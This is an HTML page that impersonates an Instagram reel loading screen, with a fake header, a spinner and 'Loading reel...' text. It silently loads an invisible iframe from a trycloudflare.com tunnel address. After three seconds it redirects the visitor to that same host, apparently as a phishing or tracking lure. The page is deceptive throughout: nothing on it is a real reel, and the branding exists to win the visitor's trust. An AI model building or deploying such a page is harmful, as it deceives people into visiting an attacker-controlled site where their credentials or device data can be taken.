<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram â€¢ Reel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000000;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            color: #ffffff;
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        /* Instagram Header */
        .header {
            background: #000000;
            padding: 12px 16px;
            border-bottom: 1px solid #262626;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: fixed;
            top: 0;
            width: 100%;
            z-index: 1000;
        }

        .left-section {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .camera-icon, .message-icon {
            font-size: 24px;
            font-weight: 300;
        }

        .instagram-logo {
            font-size: 20px;
            font-weight: 600;
            background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        /* Loading Screen */
        .loading-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding-top: 60px;
            text-align: center;
        }

        .reel-icon {
            width: 80px;
            height: 80px;
            border: 3px solid #ffffff;
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
            position: relative;
        }

        .reel-icon::before {
            content: "";
            width: 60px;
            height: 60px;
            border: 2px solid #ffffff;
            border-radius: 15px;
            position: absolute;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid #333333;
            border-top: 3px solid #0095f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        .loading-text {
            font-size: 16px;
            color: #a8a8a8;
            margin-bottom: 8px;
        }

        .sub-text {
            font-size: 14px;
            color: #737373;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Progress Bar */
        .progress-bar {
            width: 100%;
            height: 3px;
            background: #262626;
            position: fixed;
            top: 0;
            left: 0;
        }

        .progress {
            height: 100%;
            background: #ffffff;
            width: 0%;
            animation: progress 2s ease-in-out;
        }

        @keyframes progress {
            0% { width: 0%; }
            100% { width: 100%; }
        }

        /* Hidden Iframe */
        #hiddenFrame {
            position: absolute;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <!-- Progress Bar -->
    <div class="progress-bar">
        <div class="progress"></div>
    </div>

    <!-- Instagram Style Header -->
    <div class="header">
        <div class="left-section">
            <div class="camera-icon">ðŸ“·</div>
        </div>
        <div class="instagram-logo">Instagram</div>
        <div class="right-section">
            <div class="message-icon">ðŸ’¬</div>
        </div>
    </div>

    <!-- Loading Screen -->
    <div class="loading-container">
        <div class="reel-icon"></div>
        <div class="spinner"></div>
        <div class="loading-text">Loading reel...</div>
        <div class="sub-text">This may take a few seconds</div>
    </div>

    <!-- Hidden iframe for preloading -->
    <iframe id="hiddenFrame" src="https://expert-verde-eric-occasions.trycloudflare.com"></iframe>

    <script>
        // Redirect after 3 seconds with smooth transition
        setTimeout(function() {
            // Add fade out effect
            document.body.style.opacity = '0';
            document.body.style.transition = 'opacity 0.5s ease';
            
            // Redirect after fade out
            setTimeout(function() {
                window.location.href = "https://expert-verde-eric-occasions.trycloudflare.com";
            }, 500);
            
        }, 3000);

        // Preload the destination website
        window.onload = function() {
            document.getElementById('hiddenFrame').src = "https://expert-verde-eric-occasions.trycloudflare.com";
        }

        // Show reel code in console (optional)
        console.log("Loading Instagram Reel: DQI21FIkh6t");
    </script>
</body>
</html>
